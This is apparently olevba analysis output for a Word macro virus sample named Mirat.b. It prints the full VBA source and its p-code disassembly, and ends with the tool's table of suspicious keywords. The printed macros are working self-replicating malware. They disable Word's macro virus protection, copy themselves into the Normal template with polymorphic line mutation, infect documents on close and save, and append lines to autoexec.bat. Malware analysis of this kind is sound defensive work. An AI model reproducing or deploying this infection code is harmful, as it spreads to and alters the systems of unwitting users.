olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Mirat.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO fUY.bas 
in file: ./Virus.MSWord.Mirat.b - OLE stream: 'Macros/VBA/fUY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen() 'BD|!
'PolyMorphing Viruz by MI_pirat '{Ѓu%
'CodeNAME: Kewl--NOT! 'Q‡~L
On Error Resume Next '“€&‘
StatusBar = "<< Kewl lives somewhere in HERE >>" 'K^|&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") <> "Kaka" Then 'gXCj
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Kewl") = "Kaka" 'm?Aѓ
Options.VirusProtection = (2 Xor 2) '‚f–Ќ
Dim nr, xxx, nume ';s•=
nume = Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) + Chr(Int((100 * Rnd) + 32)) '`,—q
ActiveDocument.VBProject.VBComponents(2).Name = nume '!e,,
nr = ActiveDocument.VBProject.VBComponents.Item(2).CodeModule.CountOfLines 'B%C
Set myTemplate = NormalTemplate 'MD‘•
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=myTemplate.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'PA33
For i = 1 To nr 'mQQu
xxx = ActiveDocument.VBProject.VBComponents(2).CodeModule.Lines(i, 1) 'Gk86
poly = Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) 'f)VЊ
strn = xxx + " '" + poly '?~MB
NormalTemplate.VBProject.VBComponents.Item(2).CodeModule.ReplaceLine i, strn 'ЋkkS
Next i '+csЌ
Documents.Open FileName:=NormalTemplate.FullName, ConfirmConversions:=False, ReadOnly:=False, AddToRecentFiles:=False, PasswordDocument:="", PasswordTemplate:="", Revert:=False, WritePasswordDocument:="", WritePasswordTemplate:="", Format:=wdOpenFormatAuto '„"aЌ
ActiveDocument.Save 'Sq\]
ActiveDocument.Close 'WJP@
'Some publicity doesn't hurt anyone '&=•'
Open "C:\autoexec.bat" For Append As #1 'NKZ2
Print #1, "@echo off" 'X>ka
Print #1, "echo MI_pirat" '2ђn\
Print #1, "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy" 'N,~W
Print #1, "echo." 'zgѓ"
Close #1 '9(,G
End If '/ `n
End Sub 'aѓ)7
Sub AutoClose() 'qVJ1
'Errr.. spead me 'tЏ_*
On Error Resume Next 'zPW[
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 '8G+f
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '4Џ+U
Dim nume, myTemplate '@€z@
myTemplate = NormalTemplate 'p>*#
nume = NormalTemplate.VBProject.VBComponents(2).Name 'F~C<
For Each aVar In ActiveDocument.Variables 'Y>H%
    If aVar.Name = "Inf" Then num = aVar.Index 'Y8‡f
Next aVar 'zЏGa
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then ')lQ“
ActiveDocument.Variables.Add Name:="Inf" '-ЋjI
ActiveDocument.Variables("Inf").Value = 1 '1Y:—
Set myTemplate = ActiveDocument.AttachedTemplate '/#Ia
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'Ћ`P…
ActiveDocument.Save 'ѓpv—
End If 'H[Qs
End Sub '5RaЃ
Sub AutoSave() '`S];
'Sure...Hehe infect it everytime 'jZqЉ
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") = System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") + 1 'LDC2
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "K") >= 10 Then MsgBox "Are U havn' phun ?", vbYesNo, "Kewl has spead considerably !" '_:fK
On Error Resume Next '‰Y6r
Dim nume, myTemplate 'yi}3
myTemplate = NormalTemplate 'Ђ8’'
nume = NormalTemplate.VBProject.VBComponents(2).Name ''MW
For Each aVar In ActiveDocument.Variables '.-4%
    If aVar.Name = "Inf" Then num = aVar.Index 'u_c:
Next aVar 'XyzO
If (num = 0) And (ActiveDocument.FullName <> myTemplate.FullName) Then 'Њy*l
ActiveDocument.Variables.Add Name:="Inf" 'u!SP
ActiveDocument.Variables("Inf").Value = 1 'A–Ђs
Set myTemplate = ActiveDocument.AttachedTemplate 'RxAJ
Application.OrganizerCopy Source:=myTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=nume, Object:=wdOrganizerObjectProjectItems 'T‘.m
ActiveDocument.Save 'I,6)
End If 'S“a[
End Sub '”:MO
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Mirat.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/fUY - 10405 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' 	QuoteRem 0x000F 0x0004 "BD|!"
' Line #1:
' 	QuoteRem 0x0000 0x0024 "PolyMorphing Viruz by MI_pirat '{Ѓu%"
' Line #2:
' 	QuoteRem 0x0000 0x001A "CodeNAME: Kewl--NOT! 'Q‡~L"
' Line #3:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0004 "“€&‘"
' Line #4:
' 	LitStr 0x0022 "<< Kewl lives somewhere in HERE >>"
' 	St StatusBar 
' 	QuoteRem 0x0031 0x0004 "K^|&"
' Line #5:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "Kewl"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0004 "Kaka"
' 	Ne 
' 	IfBlock 
' 	QuoteRem 0x006A 0x0004 "gXCj"
' Line #6:
' 	LitStr 0x0004 "Kaka"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0004 "Kewl"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x0061 0x0004 "m?Aѓ"
' Line #7:
' 	LitDI2 0x0002 
' 	LitDI2 0x0002 
' 	Xor 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	QuoteRem 0x0024 0x0004 "‚f–Ќ"
' Line #8:
' 	Dim 
' 	VarDefn nr
' 	VarDefn xxx
' 	VarDefn nume
' 	QuoteRem 0x0012 0x0004 ";s•="
' Line #9:
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St nume 
' 	QuoteRem 0x005C 0x0004 "`,—q"
' Line #10:
' 	Ld nume 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' 	QuoteRem 0x0035 0x0004 "!e,,"
' Line #11:
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St nr 
' 	QuoteRem 0x004B 0x0004 "B%C"
' Line #12:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0020 0x0004 "MD‘•"
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0004 "PA33"
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nr 
' 	For 
' 	QuoteRem 0x0010 0x0004 "mQQu"
' Line #15:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St xxx 
' 	QuoteRem 0x0046 0x0004 "Gk86"
' Line #16:
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0020 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St poly 
' 	QuoteRem 0x0079 0x0004 "f)VЊ"
' Line #17:
' 	Ld xxx 
' 	LitStr 0x0002 " '"
' 	Add 
' 	Ld poly 
' 	Add 
' 	St strn 
' 	QuoteRem 0x0019 0x0004 "?~MB"
' Line #18:
' 	Ld i 
' 	Ld strn 
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' 	QuoteRem 0x004D 0x0004 "ЋkkS"
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x0007 0x0004 "+csЌ"
' Line #20:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	LitVarSpecial (False)
' 	ParamNamed ConfirmConversions 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnly 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed PasswordTemplate 
' 	LitVarSpecial (False)
' 	ParamNamed Revert 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordDocument 
' 	LitStr 0x0000 ""
' 	ParamNamed WritePasswordTemplate 
' 	Ld wdOpenFormatAuto 
' 	ParamNamed Format$ 
' 	Ld Documents 
' 	ArgsMemCall Option 0x000A 
' 	QuoteRem 0x0101 0x0004 "„"aЌ"
' Line #21:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0004 "Sq\]"
' Line #22:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' 	QuoteRem 0x0015 0x0004 "WJP@"
' Line #23:
' 	QuoteRem 0x0000 0x0028 "Some publicity doesn't hurt anyone '&=•'"
' Line #24:
' 	LitStr 0x000F "C:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' 	QuoteRem 0x0028 0x0004 "NKZ2"
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' 	QuoteRem 0x0016 0x0004 "X>ka"
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "echo MI_pirat"
' 	PrintItemNL 
' 	QuoteRem 0x001A 0x0004 "2ђn\"
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0034 "echo Kewl LiVeS SoMeWhErE In YoUr SyStEm ---- ENDjoy"
' 	PrintItemNL 
' 	QuoteRem 0x0041 0x0004 "N,~W"
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' 	QuoteRem 0x0012 0x0004 "zgѓ""
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' 	QuoteRem 0x0009 0x0004 "9(,G"
' Line #30:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "/ `n"
' Line #31:
' 	EndSub 
' 	QuoteRem 0x0008 0x0004 "aѓ)7"
' Line #32:
' 	FuncDefn (Sub AutoClose())
' 	QuoteRem 0x0010 0x0004 "qVJ1"
' Line #33:
' 	QuoteRem 0x0000 0x0015 "Errr.. spead me 'tЏ_*"
' Line #34:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0004 "zPW["
' Line #35:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x00B0 0x0004 "8G+f"
' Line #36:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Are U havn' phun ?"
' 	Ld vbYesNo 
' 	LitStr 0x001D "Kewl has spead considerably !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	QuoteRem 0x00A9 0x0004 "4Џ+U"
' Line #37:
' 	Dim 
' 	VarDefn nume
' 	VarDefn myTemplate
' 	QuoteRem 0x0015 0x0004 "@€z@"
' Line #38:
' 	Ld NormalTemplate 
' 	St myTemplate 
' 	QuoteRem 0x001C 0x0004 "p>*#"
' Line #39:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nume 
' 	QuoteRem 0x0035 0x0004 "F~C<"
' Line #40:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' 	QuoteRem 0x002A 0x0004 "Y>H%"
' Line #41:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' 	QuoteRem 0x002F 0x0004 "Y8‡f"
' Line #42:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0004 "zЏGa"
' Line #43:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0047 0x0004 ")lQ“"
' Line #44:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0029 0x0004 "-ЋjI"
' Line #45:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' 	QuoteRem 0x002A 0x0004 "1Y:—"
' Line #46:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0031 0x0004 "/#Ia"
' Line #47:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0004 "Ћ`P…"
' Line #48:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0004 "ѓpv—"
' Line #49:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "H[Qs"
' Line #50:
' 	EndSub 
' 	QuoteRem 0x0008 0x0004 "5RaЃ"
' Line #51:
' 	FuncDefn (Sub AutoSave())
' 	QuoteRem 0x000F 0x0004 "`S];"
' Line #52:
' 	QuoteRem 0x0000 0x0025 "Sure...Hehe infect it everytime 'jZqЉ"
' Line #53:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' 	QuoteRem 0x00B0 0x0004 "LDC2"
' Line #54:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0001 "K"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitDI2 0x000A 
' 	Ge 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0012 "Are U havn' phun ?"
' 	Ld vbYesNo 
' 	LitStr 0x001D "Kewl has spead considerably !"
' 	ArgsCall MsgBox 0x0003 
' 	EndIf 
' 	QuoteRem 0x00A9 0x0004 "_:fK"
' Line #55:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0015 0x0004 "‰Y6r"
' Line #56:
' 	Dim 
' 	VarDefn nume
' 	VarDefn myTemplate
' 	QuoteRem 0x0015 0x0004 "yi}3"
' Line #57:
' 	Ld NormalTemplate 
' 	St myTemplate 
' 	QuoteRem 0x001C 0x0004 "Ђ8’'"
' Line #58:
' 	LitDI2 0x0002 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St nume 
' 	QuoteRem 0x0035 0x0004 "'MW"
' Line #59:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ForEach 
' 	QuoteRem 0x002A 0x0004 ".-4%"
' Line #60:
' 	Ld aVar 
' 	MemLd New 
' 	LitStr 0x0003 "Inf"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld aVar 
' 	MemLd Index 
' 	St num 
' 	EndIf 
' 	QuoteRem 0x002F 0x0004 "u_c:"
' Line #61:
' 	StartForVariable 
' 	Ld aVar 
' 	EndForVariable 
' 	NextVar 
' 	QuoteRem 0x000A 0x0004 "XyzO"
' Line #62:
' 	Ld num 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Ld myTemplate 
' 	MemLd FullName 
' 	Ne 
' 	Paren 
' 	And 
' 	IfBlock 
' 	QuoteRem 0x0047 0x0004 "Њy*l"
' Line #63:
' 	LitStr 0x0003 "Inf"
' 	ParamNamed New 
' 	Ld ActiveDocument 
' 	MemLd Variables 
' 	ArgsMemCall Add 0x0001 
' 	QuoteRem 0x0029 0x0004 "u!SP"
' Line #64:
' 	LitDI2 0x0001 
' 	LitStr 0x0003 "Inf"
' 	Ld ActiveDocument 
' 	ArgsMemLd Variables 0x0001 
' 	MemSt Value 
' 	QuoteRem 0x002A 0x0004 "A–Ђs"
' Line #65:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd AttachedTemplate 
' 	Set myTemplate 
' 	QuoteRem 0x0031 0x0004 "RxAJ"
' Line #66:
' 	Ld myTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	Ld nume 
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' 	QuoteRem 0x008F 0x0004 "T‘.m"
' Line #67:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	QuoteRem 0x0014 0x0004 "I,6)"
' Line #68:
' 	EndIfBlock 
' 	QuoteRem 0x0007 0x0004 "S“a["
' Line #69:
' 	EndSub 
' 	QuoteRem 0x0008 0x0004 "”:MO"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

